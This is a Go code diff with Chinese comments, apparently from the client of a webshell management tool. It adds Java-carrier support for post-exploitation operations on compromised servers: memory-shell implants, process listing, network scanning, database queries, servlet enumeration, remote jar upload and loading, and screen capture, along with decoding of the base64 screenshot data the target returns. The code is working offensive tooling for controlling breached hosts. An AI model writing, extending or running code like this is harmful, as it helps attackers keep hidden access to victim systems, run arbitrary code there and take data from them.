@@ -298,13 +298,13 @@ func (c *Client) WriteFile(path, content string, b64Data string) (Result, error)
 // screenshot 特例：输出 IMG:<base64>，剥前缀填入 Data。
 func (c *Client) RoundTripExt(op string, p ExtParams) (Result, error) {
 	// 扩展插件在脚本载体里是「服务端脚本源码」，Java 载体只认字节码，发过去必然 bad wire magic。
-	// 能对齐的几项（内存马/进程/网络/数据库）在载荷里用 JDK 自带 API 重写了等价实现，
-	// 映射成载荷 op 后走同一套传输；其余插件（zip/servlet/jar/screenshot）仍是脚本载体专属。
+	// 能对齐的几项（内存马/进程/网络/数据库/Servlet 枚举/Jar 加载/截图）在载荷里用 JDK
+	// 自带 API 重写了等价实现，映射成载荷 op 后走同一套传输；zip/unzip 仍是脚本载体专属。
 	if c.useJavaCarrier() {
 		if jop, args, ok := javaExtOp(op, p); ok {
 			return c.javaCall(jop, args, op)
 		}
-		return Result{}, fmt.Errorf("Java 载体暂不支持扩展操作 %q（可用：memshell*/proc_list/net_scan/db_exec/db_probe；其余插件仍是脚本载体专属）", op)
+		return Result{}, fmt.Errorf("Java 载体暂不支持扩展操作 %q（可用：memshell*/proc_list/net_scan/net_list/db_exec/db_probe/servlet_list/jar_load/screenshot；压缩仍是脚本载体专属）", op)
 	}
 	code, err := ExtBuild(c.ScriptType, op, p)
 	if err != nil {
@@ -355,7 +355,13 @@ func (c *Client) javaCall(jop string, args []string, parseOp string) (Result, er
 	if err != nil {
 		return Result{}, err
 	}
-	return Parse(dec, parseOp), nil
+	res := Parse(dec, parseOp)
+	// 截图两种载体都回 IMG:<base64>：剥前缀填 Data，免得前端把几 MB 的串当文本渲染
+	if strings.HasPrefix(res.Output, "IMG:") {
+		res.Data, _ = base64.StdEncoding.DecodeString(strings.TrimPrefix(res.Output, "IMG:"))
+		res.Output = ""
+	}
+	return res, nil
 }
 
 // JavaExtSupported 该插件 op 是否有 Java 载荷等价实现。
@@ -388,7 +394,14 @@ func javaExtOp(op string, p ExtParams) (string, []string, bool) {
 	case "net_list":
 		return "net", []string{"list"}, true
 	case "db_exec":
-		return "db", []string{p.DBType, p.Host, p.Port, p.User, p.Pass, p.DB, p.SQL}, true
+		return "db", []string{p.DBType, p.Host, p.Port, p.User, p.Pass, p.DB, p.SQL, p.JarPath}, true
+	case "servlet_list":
+		return "servlets", nil, true
+	case "jar_load":
+		// 目标端要 base64；第二个参数是保存路径，留空则由目标端给临时文件
+		return "jarload", []string{p.JarB64, p.DstPath}, true
+	case "screenshot":
+		return "shot", nil, true
 	case "db_probe":
 		return "db", []string{"drivers"}, true
 	}
